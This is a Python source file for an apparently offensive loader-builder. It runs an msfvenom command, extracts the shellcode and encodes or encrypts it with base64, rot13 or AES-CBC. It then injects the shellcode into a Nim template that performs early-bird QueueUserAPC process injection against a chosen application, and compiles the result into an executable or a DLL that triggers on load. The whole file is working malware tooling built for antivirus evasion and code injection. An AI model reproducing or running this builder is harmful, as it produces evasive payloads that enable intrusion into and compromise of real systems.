#!/bin/env python3

import subprocess
import re
import json
from cli import generate_cli_args
from modules.python.converters.bin2sc import bin2sc
#from modules.python.converters.bin2mac import bin2mac
from modules.python.obfuscators.encoders.b64_obf import b64_obf, add_base64_decoding_code
from modules.python.obfuscators.encoders.rot13_obf import rot13_obf, add_rot13_decoding_code, rot13_decode
from modules.python.obfuscators.encryptors.aes_obf import aes_obf, add_aes_decryption_code, seperateStringInto2, byteSeqToString, strToByteSeq, decryptAES

config = json.load(open(file='./config.json', encoding="utf-8"))  # Read json config file

AVAILABLE_OBFUSCATION_METHODS = config["available_obfuscation_methods"].split(',')  # Get available_obfuscation_methods and convert it into an array

# Tabs are necessary so the nim compiler doesn't complain about indentation
DLL_PLACEHOLDER = config["DLL_placeholder"]
DLL_CODE = """
    proc NimMain() {.cdecl, importc.}
    proc DllMain(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID) : BOOL {.stdcall, exportc, dynlib.} =
        NimMain()
        
        if fdwReason == DLL_PROCESS_ATTACH:
            injectQueueUserAPC(shellcode)
            discard
        elif fdwReason == DLL_THREAD_ATTACH:
            discard
        elif fdwReason == DLL_THREAD_DETACH:
            discard
        elif fdwReason == DLL_PROCESS_DETACH:
            discard

        return true
    """
REGULAR_BINARY_CODE_PLACEHOLDER = config["regular_binary_code_placeholder"] # As apposed to DLL code
REGULAR_BINARY_CODE = "injectQueueUserAPC(shellcode)"


SHELLCODE_PLACEHOLDER = config["shellcode_placeholder"]
SHELLCODE_SIZE_PLACEHOLDER = config["shellcode_size_placeholder"]
TARGET_APPLICATION_PATH_PLACEHOLDER = config["target_application_path_placeholder"]
DEOBFUSCATION_FUNCTION_PLACEHOLDER = config["deobfuscation_function_placeholder"]

NIM_EBAPC_SKEL_FILENAME = config["nim_ebapc_skel_filename"]
NIM_EBAPC_FILENAME = config["nim_ebapc_filename"]
TEMPORARY_SHELLCODE_FILENAME = config["temporary_shellcode_filename"]

# Run msfvenom
def run_msfvenom(msfvenom_command: str) -> str:
    msf_sc = subprocess.run(msfvenom_command, shell=True, capture_output=True).stdout.decode()
    return msf_sc

# Scrape shellcode
def grep_shellcode(msf_sc: str) -> str:
    sc = re.sub("\n", "", msf_sc)
    sc = re.findall("\[byte.*\]", sc)[0][5:-1].strip()
    return sc

# Get shellcode size
def get_sc_size(sc: str) -> int:
    sc_size = len(sc.split(","))
    return sc_size

# Read nim code skeleton
def read_nim_code_skel(filename: str) -> str:
    with open(filename, 'r') as f:
        nim_code = f.read()
    return nim_code

# Inject shellcode into nim code skeleton
def inject_sc(nim_code: str, sc: str) -> str:
    nim_code = nim_code.replace(SHELLCODE_PLACEHOLDER, sc)
    return nim_code

# Inject size into nim code skeleton
def inject_sc_size(nim_code: str, sc_size: int) -> str:
    # Inject size into `var shellcode: array[SIZE_INJECTED_HERE, byte]`
    nim_code = nim_code.replace(SHELLCODE_SIZE_PLACEHOLDER, str(sc_size))
    return nim_code

# Inject target path into nim code skeleton
def inject_application_path(nim_code: str, target_application_path: str) -> str:
    nim_code = nim_code.replace(TARGET_APPLICATION_PATH_PLACEHOLDER, target_application_path)
    return nim_code

# Write the nim code to a new nim file
def create_new_nim_file(new_nim_filename: str, nim_code: str):
    with open(new_nim_filename, 'w') as f:
        f.write(nim_code)

def add_deobfuscation_functions(nim_code: str, function_names: tuple) -> str:
    """
    add_deobfuscation_function(nim_code, function_names)

    Get nim_code, replace   DEOBFUSCATION_FUNCTION_PLACEHOLDER with the given deobfuscation function
    Return:
        nim_code with the added function (str)
    """
    for function_name in function_names:
        nim_code = nim_code.replace(DEOBFUSCATION_FUNCTION_PLACEHOLDER, function_name)

    return nim_code

# Add obfuscation code
def add_obfuscation(nim_code: str, sc: str, obfuscation_methods: str, available_obfuscation_methods: list) -> str:
    obfuscation_methods = obfuscation_methods.split(',')  # Convert from string of format "base64,xor,..." to list

    # Obfuscate and add the shellcode into the nim code
    for method in obfuscation_methods:
        print("Encoding: ", method)
        match method:
            case 'base64':
                sc = b64_obf(sc)
            case 'rot13':
                sc = rot13_obf(sc)
            case 'aes-cbc':
                sc, key, iv, padding_length = aes_obf(sc)    # sc, key and iv are hex encoded
                #print(      # DEBUG
                #    f"""
                #    sc: {sc}
                #    hex_key: {key}
                #    hex_iv: {iv}
                #    padding_length: {padding_length}
                #    """
                #) 
            case other:
                print(f"Obfuscation method is not found, allowed obfuscation methods are: {available_obfuscation_methods}")
        
    # Add necessary decoding/decryption functions to nim_code
    # NOTE: Why not a function?
    for method in set(obfuscation_methods):
        print("Adding functions for: ", method)
        match method:
            case 'base64':
                pass    # Base64 decoding doesn't need an external function
            case 'rot13':
                nim_code = add_deobfuscation_functions(nim_code, (rot13_decode,))
            case 'aes-cbc':
                nim_code = add_deobfuscation_functions(nim_code, (seperateStringInto2, byteSeqToString, strToByteSeq, decryptAES))
            case other:
                print(f"Decryption method not found, allowed decryption methods are: {available_obfuscation_methods}")

    # Add deobfuscation codes to the nim code
    obfuscation_methods.reverse()   # Reverse the obfuscation list
    for method in obfuscation_methods:
        print("Adding decoding code: ", method)
        match method:
            case 'base64':
                nim_code = add_base64_decoding_code(nim_code)
            case 'rot13':
                nim_code = add_rot13_decoding_code(nim_code)
            case 'aes-cbc':
                nim_code = add_aes_decryption_code(nim_code, key, iv, str(padding_length))
            case other:
                print(f"Deobfuscation method is not found, allowed obfuscation methods are: {available_obfuscation_methods}")
    
    # Inject obfuscated shellcode into nim code
    nim_code = inject_sc(nim_code, sc)
    return nim_code

# Turn the binary into a DLL
def convert_to_DLL(nim_code: str) -> str:
    nim_code = nim_code.replace(DLL_PLACEHOLDER, DLL_CODE)
    return nim_code

def main():
    args = generate_cli_args()

    # Get shellcode
    # NOTE: Why not a function?
    if args.msfvenom_command:
        msf_sc = run_msfvenom(args.msfvenom_command)    # Run msfvenom
        sc = grep_shellcode(msf_sc)                     # Get shellcode
    elif args.shellcode:
        raw_sc = args.shellcode
        bin2sc(raw_sc)
        with open(TEMPORARY_SHELLCODE_FILENAME) as f:
            sc = f.read()

    sc_size = get_sc_size(sc)                                           # Get shellcode size
    nim_code = read_nim_code_skel(NIM_EBAPC_SKEL_FILENAME)             # Read nim code skeleton
    nim_code = add_obfuscation(nim_code, sc, args.obfuscator_list, AVAILABLE_OBFUSCATION_METHODS)  # Add obfuscated shellcode
    nim_code = inject_sc_size(nim_code, sc_size)                        # Inject size into nim code skeleton
    nim_code = inject_application_path(nim_code, args.target_application_path) # Inject application path into nim code skeleton``

    if args.app == "lib":
        nim_code = convert_to_DLL(nim_code)
        cmd = f"nim c --nomain -d:mingw -o:{args.output} --lineTrace:off --stackTrace:off --opt:size -d:release --cpu:{args.cpu} --app:{args.app} {NIM_EBAPC_FILENAME}"
    else:
        nim_code = nim_code.replace(REGULAR_BINARY_CODE_PLACEHOLDER, REGULAR_BINARY_CODE)
        cmd = f"nim c -d:mingw -o:{args.output} --lineTrace:off --stackTrace:off --opt:size -d:release --cpu:{args.cpu} --app:{args.app} {NIM_EBAPC_FILENAME}"

    #print(nim_code) # DEBUG
    create_new_nim_file(NIM_EBAPC_FILENAME, nim_code)  # Create the obfuscated nim file

    subprocess.run(cmd, shell=True)
    if args.msfvenom_command:   # Remove the generated `shellcode.txt` AND the `ebapc.nim` files if the user used the `msfvenom-command` option
        subprocess.run(['rm', NIM_EBAPC_FILENAME]) 
    else:                       # Otherwise, remove only the generated `shellcode.txt`file if the user used the `shellcode` option
        subprocess.run(['rm', NIM_EBAPC_FILENAME, TEMPORARY_SHELLCODE_FILENAME])  


if __name__ == "__main__":
    main()
